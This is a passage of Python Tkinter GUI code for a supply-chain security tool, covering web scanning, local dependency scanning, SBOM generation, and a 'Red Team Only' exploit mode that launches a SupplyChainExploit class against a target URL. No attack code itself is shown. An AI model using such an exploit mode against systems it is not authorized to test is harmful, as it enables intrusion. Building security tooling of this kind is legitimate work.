        # SBOM generation frame (hidden by default)
        self.sbom_config_frame = tk.Frame(self, bg="#1e1e1e")
        
        format_frame = tk.Frame(self.sbom_config_frame, bg="#1e1e1e")
        format_frame.pack(pady=10)
        
        tk.Label(format_frame, text="Output Format:", bg="#1e1e1e", fg="white").pack(side="left", padx=5)
        self.sbom_format = tk.StringVar(value="json")
        ttk.Radiobutton(format_frame, text="JSON (CycloneDX)", variable=self.sbom_format,
                       value="json").pack(side="left", padx=5)
        ttk.Radiobutton(format_frame, text="Text", variable=self.sbom_format,
                       value="txt").pack(side="left", padx=5)
        
        tk.Label(self.sbom_config_frame, text="Generate Software Bill of Materials for compliance & audit",
                bg="#1e1e1e", fg="#FFD700", font=("Courier", 9)).pack(pady=5)

        # Exploit frame (hidden by default)
        self.exploit_config_frame = tk.Frame(self, bg="#1e1e1e")
        
        tk.Label(self.exploit_config_frame, text="Target URL:", bg="#1e1e1e", fg="white").pack(side="left", padx=5)
        self.exploit_url_entry = tk.Entry(self.exploit_config_frame, width=50)
        self.exploit_url_entry.pack(side="left", padx=5)
        self.exploit_url_entry.insert(0, "http://localhost:3000")
        
        tk.Label(self.exploit_config_frame, text="⚠️ Red Team Only",
                bg="#1e1e1e", fg="#FF4444", font=("Courier", 9, "bold")).pack(side="left", padx=10)

        # Info label
        info_frame = tk.Frame(self, bg="#1e1e1e")
        info_frame.pack(fill="x", pady=5)
        
        self.info_label = ttk.Label(info_frame, 
            text="Web: Scan vulnerabilities | Local: Dependencies | SBOM: BOM generation | Exploit: Attack simulation",
            foreground="#888")
        self.info_label.pack(side="left", padx=5)

        # Boutons
        button_frame = tk.Frame(self, bg="#1e1e1e")
        button_frame.pack(fill="x", pady=5)

        ttk.Button(button_frame, text="Start Scan",
                   command=self.start_scan).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Clear Results",
                   command=self.clear_output).pack(side="left", padx=5)

        # Zone de résultats
        results_label = ttk.Label(self, text="Scan Results:")
        results_label.pack(anchor="w", pady=(10, 0))

        self.output = scrolledtext.ScrolledText(
            self, bg="#252526", fg="white", height=20, wrap=tk.WORD, font=("Courier", 9),
            state="disabled"
        )
        self.output.pack(fill="both", expand=True, pady=5)

        # Configuration des tags pour coloration
        self.output.tag_config("vulnerable", foreground="#ff6b6b")
        self.output.tag_config("info", foreground="#4dabf7")
        self.output.tag_config("success", foreground="#51cf66")
        self.output.tag_config("warning", foreground="#ffd43b")

    def log(self, msg: str) -> None:
        """Log un message dans l'interface"""
        def _log():
            # Détection du type de message pour coloration
            if "[!]" in msg and "VULNERABLE" in msg:
                tag = "vulnerable"
            elif "[!]" in msg:
                tag = "warning"
            elif "[+]" in msg:
                tag = "success"
            elif "[*]" in msg:
                tag = "info"
            else:
                tag = None
            
            # Activer temporairement l'édition pour écrire
            self.output.config(state="normal")
            self.output.insert("end", msg + "\n", tag)
            self.output.see("end")
            self.output.config(state="disabled")
        
        if threading.current_thread() != threading.main_thread():
            self.after(0, _log)
        else:
            _log()
    
    def switch_mode(self):
        """Change l'affichage selon le mode"""
        mode = self.scan_mode.get()
        
        # Cacher tous les frames
        self.web_config_frame.pack_forget()
        self.local_config_frame.pack_forget()
        self.sbom_config_frame.pack_forget()
        self.exploit_config_frame.pack_forget()
        
        # Afficher le frame approprié
        if mode == "web":
            self.web_config_frame.pack(fill="x", pady=5)
            self.info_label.config(text="Web Scan: Detects exposed JS libraries and config files")
        elif mode == "local":
            self.local_config_frame.pack(fill="x", pady=5)
            self.info_label.config(text="Local Scan: Analyzes Python and Node.js dependencies")
        elif mode == "sbom":
            self.sbom_config_frame.pack(fill="x", pady=5)
            self.info_label.config(text="SBOM Generator: Creates Software Bill of Materials for compliance")
        else:  # exploit
            self.exploit_config_frame.pack(fill="x", pady=5)
            self.info_label.config(text="Exploit Mode: Simulates Supply Chain attacks")

    def clear_output(self) -> None:
        """Efface les résultats"""
        self.output.config(state="normal")
        self.output.delete(1.0, "end")
        self.output.config(state="disabled")

    def start_scan(self) -> None:
        """Démarre le scan dans un thread séparé"""
        self.clear_output()
        
        if self.scan_mode.get() == "web":
            # Web scan
            url = self.url_entry.get().strip()
            
            if not url:
                self.log("[!] Please enter a target URL")
                return
            
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                self.url_entry.delete(0, "end")
                self.url_entry.insert(0, url)
            
            self.log("[*] Initializing web supply chain scanner...")
            
            self.scanner = SupplyChainScanner(self.log)
            self.scan_thread = threading.Thread(
                target=self.scanner.scan_url,
                args=(url,),
                daemon=True
            )
            self.scan_thread.start()
        
        elif self.scan_mode.get() == "local":
            # Local scan
            self.log("[*] Initializing local dependency scanner...")
            
            self.local_scanner = LocalDependencyScanner(self.log)
            self.scan_thread = threading.Thread(
                target=self.local_scanner.scan_all,
                daemon=True
            )
            self.scan_thread.start()
        
        elif self.scan_mode.get() == "sbom":
            # SBOM Generation
            output_format = self.sbom_format.get()
            
            self.log("[*] Initializing SBOM generator...")
            
            self.sbom_generator = SBOMGenerator(self.log)
            self.scan_thread = threading.Thread(
                target=self.sbom_generator.generate_sbom,
                args=(output_format,),
                daemon=True
            )
            self.scan_thread.start()
        
        else:  # exploit
            # Supply Chain Exploitation
            url = self.exploit_url_entry.get().strip()
            
            if not url:
                self.log("[!] Please enter a target URL")
                return
            
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                self.exploit_url_entry.delete(0, "end")
                self.exploit_url_entry.insert(0, url)
            
            self.log("[*] Initializing exploit module...")
            
            self.exploit = SupplyChainExploit(self.log)
            self.scan_thread = threading.Thread(
                target=self.exploit.exploit_target,
                args=(url,),
                daemon=True
            )
            self.scan_thread.start()


# Pour compatibilité avec l'ancien système
def main():
    """Point d'entrée pour l'exécution standalone (mode CLI)"""
    print("This module is designed to be used within the GUI.")
    print("Run main.py instead.")


if __name__ == "__main__":
    main()
